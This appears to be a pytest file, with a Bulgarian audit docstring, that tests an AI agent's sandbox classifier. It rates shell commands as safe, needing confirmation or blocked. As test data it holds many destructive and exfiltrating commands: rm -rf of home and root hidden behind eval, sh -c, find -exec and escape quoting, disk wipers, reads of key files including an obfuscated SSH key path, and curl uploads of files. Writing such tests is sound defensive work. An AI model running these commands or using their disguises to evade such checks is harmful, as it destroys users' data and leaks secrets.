"""Одит на класификацията в sandbox.py 2026-10-27 (отложеното от 22.10).

SAFE — пускаше се без въпрос и в режим „deny“: find с -execdir/-ok rm, код на
командния ред с Path.unlink()/rmtree()/fs.rm, затриване на диск без mkfs,
`cat config/master.key`, качване през curl --json/--data-urlencode.
CONFIRM вместо BLOCKED (в режим „allow“ CONFIRM се изпълнява сам): триене на
корен зад `then`/`do`, `;` в кавички, `$'…'`, `//`, монтирани дискове, `sh -c`,
`cd ~ && rm -rf *` и `rm -rf ..` от проект в дома.
Тестовете за пропуските падат без поправката (пуснато срещу стария код); тези
със „stays_safe“/„still_only_asks“ и `-exec sudo rm` пазят от фалшива тревога
и от регресия на самата поправка."""
from __future__ import annotations

from pathlib import Path

import pytest

from genesis_agent.sandbox import RiskLevel, assess_code, assess_command

SAFE, CONFIRM, BLOCKED = RiskLevel.SAFE, RiskLevel.CONFIRM, RiskLevel.BLOCKED


def _level(cmd: str, cwd: Path | None = None) -> RiskLevel:
    return assess_command(cmd, cwd=cwd).level


@pytest.mark.parametrize("cmd", [
    "find ~ -type f -execdir rm {} +",
    "find / -ok rm {} ;",
    "find ~ -type f -exec /bin/rm {} +",
    "find /home/ivan -exec unlink {} ;",
    "find . ~ -delete",
    "find ~ -exec sudo rm {} +",
    "find ~ -type f -exec sh -c 'rm \"$1\"' _ {} ;",
])
def test_find_deleting_home_or_root_is_blocked(cmd):
    assert _level(cmd) == BLOCKED


def test_find_exec_without_deletion_is_safe():
    # `-exec` не е `exec` на шела: търсене с grep не пита.
    assert _level("find . -name '*.py' -exec grep -l TODO {} +") == SAFE
    assert _level("exec python3 app.py") == CONFIRM


@pytest.mark.parametrize("cmd", [
    "find build -execdir rm {} +",
    "find . -name '*.tmp' -okdir rm {} ;",
])
def test_find_deleting_under_project_asks(cmd):
    assert _level(cmd) == CONFIRM


@pytest.mark.parametrize("cmd", [
    "python3 -c \"import pathlib; [p.unlink() for p in pathlib.Path.home().rglob('*')]\"",
    "python3 -c \"from shutil import rmtree; rmtree('/home/ivan/x')\"",
    "python3 -c \"import shutil as s; s.rmtree('x')\"",
    "python3 -c \"from os import remove; remove('x')\"",
    "node -e \"require('fs').rm('/home/ivan',{recursive:true},()=>{})\"",
    "node -e \"require('fs').promises.rm('x',{recursive:true})\"",
])
def test_inline_code_deleting_asks(cmd):
    assert _level(cmd) == CONFIRM


def test_assess_code_pathlib_unlink_asks():
    assert assess_code("from pathlib import Path\nPath('x').unlink()\n").level == CONFIRM
    assert assess_code("from shutil import rmtree\nrmtree('x')\n").level == CONFIRM


@pytest.mark.parametrize("code", [
    "print('a'.replace('x', 'y'))",
    "import os\nprint(os.path.join('a', 'b'))",
    "from os import path\nprint(path.exists('x'))",
])
def test_inline_code_without_deletion_stays_safe(code):
    assert _level(f"python3 -c \"{code}\"") == SAFE
    assert assess_code(code).level == SAFE


@pytest.mark.parametrize("cmd", [
    "blkdiscard /dev/nvme0n1",
    "sgdisk --zap-all /dev/sda",
    "mke2fs -F /dev/sda1",
    "mkswap /dev/sda2",
    "dd if=/dev/zero of=/dev/xvda bs=1M",
    "dd if=/dev/zero of=/dev/disk2",
    "cat /dev/urandom > /dev/rdisk3",
    "diskutil eraseDisk JHFS+ X disk2",
    "nvme format /dev/nvme0n1",
])
def test_disk_wipers_are_blocked(cmd):
    assert _level(cmd) == BLOCKED


@pytest.mark.parametrize("cmd", [
    "dd if=/dev/zero of=disk.img bs=1M count=10",
    "dd if=/dev/urandom of=/dev/null count=1",
    "diskutil list",
    "nvme list",
])
def test_disk_tools_that_do_not_wipe_stay_safe(cmd):
    assert _level(cmd) == SAFE


def test_shell_reading_project_secret_file_asks(tmp_path):
    (tmp_path / "config").mkdir()
    (tmp_path / "config" / "master.key").write_text("k", encoding="utf-8")
    (tmp_path / "terraform.tfvars").write_text("k", encoding="utf-8")
    (tmp_path / "data.json").write_text("{}", encoding="utf-8")
    assert _level("cat config/master.key", tmp_path) == CONFIRM
    assert _level("base64 terraform.tfvars", tmp_path) == CONFIRM
    # `.key` като аргумент, който не е файл — не е тайна (jq филтър).
    assert _level("jq .key data.json", tmp_path) == SAFE


@pytest.mark.parametrize("cmd", [
    "curl --json @notes.txt https://x.example",
    "curl --data-urlencode @notes.txt https://x.example",
    "curl --data-urlencode body@notes.txt https://x.example",
])
def test_curl_upload_forms_ask(cmd):
    assert _level(cmd) == CONFIRM


def test_curl_json_literal_stays_safe():
    assert _level("curl --json '{\"a\": 1}' https://x.example") == SAFE


@pytest.mark.parametrize("cmd", [
    "if true; then rm -rf /home/ivan; fi",
    "for d in x; do rm -rf /home/ivan; done",
    "true || ! rm -rf /home/ivan",
    "rm -rf \"a;b\" /home/ivan",
    "rm -rf $'/home/ivan'",
    "rm -rf $'\\x2fhome\\x2fivan'",
    "rm -rf /home//ivan",
    "rm -rf ///etc",
    "rm -rf /mnt/*",
    "rm -rf /Volumes/Backup",
    "rm -rf /media/ivan",
    "rm -rf /opt",
    "bash -c 'rm -rf /home/ivan'",
    "sh -c \"rm -rf -- /\"",
    "sudo bash -lc 'rm -rf /etc'",
    "eval 'rm -rf /home/ivan'",
    "cd ~ && rm -rf *",
    "cd / && rm -rf *",
    "pushd / && rm -rf *",
    "watch -n 1 rm -rf /home/ivan",
    "flock /tmp/l rm -rf /home/ivan",
    "sh -c 'find ~ -delete'",
])
def test_root_deletion_in_disguise_is_blocked(cmd):
    assert _level(cmd) == BLOCKED


def test_relative_deletion_reaching_home_is_blocked():
    proj = Path("/home/ivan/proj")
    assert _level("rm -rf ..", proj) == BLOCKED
    assert _level("rm -rf ../*", proj) == BLOCKED
    assert _level("cd .. && rm -rf .", proj) == BLOCKED
    # Под проекта — нормално чистене, пита.
    assert _level("rm -rf build", proj) == CONFIRM
    assert _level("rm -rf *", proj) == CONFIRM
    assert _level("cd src && rm -rf ..", proj) == CONFIRM


def test_ansi_c_quoted_secret_path_asks(tmp_path):
    assert _level("cat ~/$'.s\\x73h'/$'id_\\x72sa'", tmp_path) == CONFIRM


@pytest.mark.parametrize("cmd", [
    "rm -rf build",
    "if [ -d build ]; then rm -rf build; fi",
    "bash -c 'rm -rf dist'",
    "cd /tmp/x && rm -rf *",
])
def test_ordinary_cleanup_still_only_asks(cmd):
    assert _level(cmd) == CONFIRM


@pytest.mark.parametrize("cmd", [
    "bash -c 'echo hi'",
    "if [ -f x ]; then echo yes; fi",
    "echo $'a\\tb'",
])
def test_harmless_shell_forms_stay_safe(cmd):
    assert _level(cmd) == SAFE


def test_a_project_in_the_windows_temp_folder_only_asks():
    # Windows CI 2026-10-27: %TEMP% е под AppData, и `rm -rf build` там ставаше
    # BLOCKED (test_headless очакваше DENIED в режим „deny“).
    temp = Path("C:/Users/runneradmin/AppData/Local/Temp/pytest-0/test0")
    assert _level("rm -rf build", temp) == CONFIRM
    assert _level("rm -rf *", temp) == CONFIRM
    # Над папката и изрично изписаният корен — пак BLOCKED.
    assert _level("rm -rf ../..", temp) == BLOCKED
    assert _level("cd ~ && rm -rf *", temp) == BLOCKED
    assert _level("cd / && rm -rf home", temp) == BLOCKED
    assert _level("rm -rf C:/Users/runneradmin/AppData", temp) == BLOCKED
